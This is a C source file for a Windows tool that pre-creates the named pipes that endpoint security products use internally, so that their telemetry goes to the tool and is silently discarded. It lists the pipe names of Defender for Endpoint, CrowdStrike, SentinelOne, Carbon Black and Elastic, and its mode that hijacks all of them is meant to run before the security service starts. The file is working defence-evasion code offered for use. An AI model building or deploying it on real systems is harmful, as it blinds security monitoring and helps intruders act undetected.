/*
 * 15_pipe_hijack.c
 * Named Pipe IPC Interception — silently consume EDR telemetry
 *
 * Many EDR agents use named pipes for inter-component IPC:
 *   - MsSense.exe ↔ MsSenseS.exe via \pipe\SensePipeName
 *   - SentinelAgent ↔ SentinelStaticEngine via private pipes
 *   - Some agents pipe event data from kernel driver (KMDF) to user-mode service
 *
 * By creating the named pipe BEFORE the EDR component does, we become the
 * server and receive all IPC messages — silently dropping or logging them.
 * The EDR sender's ConnectNamedPipe / CallNamedPipe succeeds (we answered)
 * but the intended receiver never gets the data.
 *
 * Additionally demonstrates GetNamedPipeClientProcessId (Vista+) to log senders.
 *
 * Build:
 *   cl 15_pipe_hijack.c /link
 *
 * Usage:
 *   15_pipe_hijack.exe list                     Enumerate all named pipes on system
 *   15_pipe_hijack.exe hijack <pipename>         Hijack a specific pipe (no leading \\.\pipe\)
 *   15_pipe_hijack.exe hijack-edr                Hijack all known EDR pipe names
 *
 * Example:
 *   15_pipe_hijack.exe hijack SensePipeName
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

/* Known EDR named pipes — add more as discovered via Process Monitor / Wireshark pipe filter */
static const WCHAR *EDR_PIPES[] = {
    L"SensePipeName",          /* Microsoft Defender for Endpoint */
    L"SenseIRPipeName",        /* MDE IR (Investigation) service */
    L"SensePipe",              /* MDE variant */
    L"MicrosoftSense",         /* MDE variant */
    L"SentinelPipe",           /* SentinelOne */
    L"CsAgent",                /* CrowdStrike */
    L"CsFalcon",               /* CrowdStrike */
    L"cbstream",               /* VMware Carbon Black */
    L"cb_pipe",                /* Carbon Black */
    L"AmSvc",                  /* Elastic Agent */
    NULL
};

typedef struct _HIJACK_CTX {
    HANDLE hPipe;
    WCHAR  pipeName[256];
} HIJACK_CTX;

static volatile BOOL g_Running = TRUE;

static BOOL WINAPI ConsoleHandler(DWORD sig)
{
    if (sig == CTRL_C_EVENT) { g_Running = FALSE; return TRUE; }
    return FALSE;
}

/*
 * Named pipe worker thread:
 *   1. Wait for a client to connect (ConnectNamedPipe)
 *   2. Read and discard all data from the client
 *   3. Close connection, wait for next client (loop)
 */
static DWORD WINAPI PipeWorker(LPVOID param)
{
    HIJACK_CTX *ctx = (HIJACK_CTX *)param;

    BYTE   buf[4096];
    DWORD  bytesRead = 0;

    wprintf(L"  [+] Hijack thread started for: %s\n", ctx->pipeName);

    while (g_Running) {
        /* Wait for client */
        BOOL connected = ConnectNamedPipe(ctx->hPipe, NULL);
        if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
            if (!g_Running) break;
            Sleep(100);
            continue;
        }

        /* Identify the connecting process */
        ULONG clientPid = 0;
        GetNamedPipeClientProcessId(ctx->hPipe, &clientPid);
        wprintf(L"  [*] Client connected to %s (PID=%lu)\n",
                ctx->pipeName, clientPid);

        /* Drain all data */
        DWORD totalDrained = 0;
        while (ReadFile(ctx->hPipe, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0) {
            totalDrained += bytesRead;
            wprintf(L"  [~] Drained %lu bytes from PID=%lu\n", bytesRead, clientPid);
        }

        wprintf(L"  [*] Client disconnected (total drained: %lu bytes)\n", totalDrained);
        DisconnectNamedPipe(ctx->hPipe);
    }

    HeapFree(GetProcessHeap(), 0, ctx);
    return 0;
}

/*
 * Create a named pipe and start a worker thread.
 * Returns thread handle or NULL on failure.
 */
static HANDLE HijackPipe(const WCHAR *shortName)
{
    WCHAR fullPath[512] = {0};
    _snwprintf_s(fullPath, ARRAYSIZE(fullPath), _TRUNCATE,
                 L"\\\\.\\pipe\\%s", shortName);

    /* PIPE_ACCESS_DUPLEX to accept both read/write clients */
    HANDLE hPipe = CreateNamedPipeW(
        fullPath,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        4096, 4096,
        0,    /* default timeout */
        NULL  /* default security — allows any process to connect */
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if (err == ERROR_ALREADY_EXISTS) {
            wprintf(L"  [-] Pipe already exists (EDR may have started first): %s\n", shortName);
        } else {
            wprintf(L"  [-] CreateNamedPipe failed (%lu): %s\n", err, shortName);
        }
        return NULL;
    }

    wprintf(L"  [+] Created pipe: %s\n", fullPath);

    HIJACK_CTX *ctx = (HIJACK_CTX *)HeapAlloc(GetProcessHeap(), 0, sizeof(HIJACK_CTX));
    ctx->hPipe = hPipe;
    wcsncpy_s(ctx->pipeName, ARRAYSIZE(ctx->pipeName), shortName, _TRUNCATE);

    HANDLE hThread = CreateThread(NULL, 0, PipeWorker, ctx, 0, NULL);
    if (!hThread) {
        wprintf(L"  [-] CreateThread failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    return hThread;
}

/*
 * Enumerate named pipes on the system by querying \\.\ directory.
 * Simpler approach: open the pipe directory using FindFirstFile.
 */
static void ListPipes(void)
{
    WIN32_FIND_DATAW fd = {0};
    HANDLE hFind = FindFirstFileW(L"\\\\.\\pipe\\*", &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Cannot enumerate pipes: %lu\n", GetLastError());
        return;
    }

    DWORD count = 0;
    wprintf(L"Named pipes on this system:\n");
    do {
        wprintf(L"  %s\n", fd.cFileName);
        count++;
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    wprintf(L"\n[*] Total: %lu pipe(s)\n", count);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] Named Pipe Hijack Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s list                    Enumerate all system named pipes\n", argv[0]);
        wprintf(L"  %s hijack <pipename>        Hijack a specific pipe (short name only)\n", argv[0]);
        wprintf(L"  %s hijack-edr               Hijack all known EDR pipe names\n", argv[0]);
        wprintf(L"\nNote: Run BEFORE the EDR service starts for best results.\n");
        wprintf(L"      If the pipe already exists, EDR started first.\n");
        return 1;
    }

    if (_wcsicmp(argv[1], L"list") == 0) {
        ListPipes();
        return 0;
    }

    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    HANDLE threads[64] = {0};
    int    threadCount = 0;

    if (_wcsicmp(argv[1], L"hijack") == 0) {
        if (argc < 3) {
            wprintf(L"[-] Specify a pipe name (without \\\\.\\ prefix)\n");
            return 1;
        }
        HANDLE hThread = HijackPipe(argv[2]);
        if (hThread) threads[threadCount++] = hThread;

    } else if (_wcsicmp(argv[1], L"hijack-edr") == 0) {
        wprintf(L"[*] Attempting to hijack %d known EDR pipe(s)...\n\n",
                (int)(sizeof(EDR_PIPES)/sizeof(EDR_PIPES[0]) - 1));
        for (int i = 0; EDR_PIPES[i] != NULL; i++) {
            HANDLE hThread = HijackPipe(EDR_PIPES[i]);
            if (hThread && threadCount < 64) threads[threadCount++] = hThread;
        }

    } else {
        wprintf(L"[-] Unknown command: %s\n", argv[1]);
        return 1;
    }

    if (threadCount == 0) {
        wprintf(L"\n[-] No pipes were successfully created.\n");
        return 1;
    }

    wprintf(L"\n[+] Hijacking %d pipe(s). Waiting for connections... (Ctrl+C to stop)\n\n",
            threadCount);

    while (g_Running) Sleep(500);

    /* Cleanup */
    wprintf(L"\n[*] Shutting down...\n");
    WaitForMultipleObjects((DWORD)threadCount, threads, TRUE, 5000);
    for (int i = 0; i < threadCount; i++) CloseHandle(threads[i]);

    wprintf(L"[+] Done.\n");
    return 0;
}
